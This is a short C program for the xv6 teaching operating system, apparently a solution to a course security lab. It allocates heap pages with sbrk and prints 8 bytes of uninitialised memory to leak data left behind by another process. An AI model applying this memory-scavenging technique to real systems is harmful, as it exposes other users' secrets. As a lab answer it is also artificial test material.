#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  if (argc != 1) {
    printf("Usage: attack\n");
    exit(1);
  }
  char *end = sbrk(PGSIZE*32);
  end += 16 * PGSIZE;
  write(2, end+32, 8);
  exit(0);
}
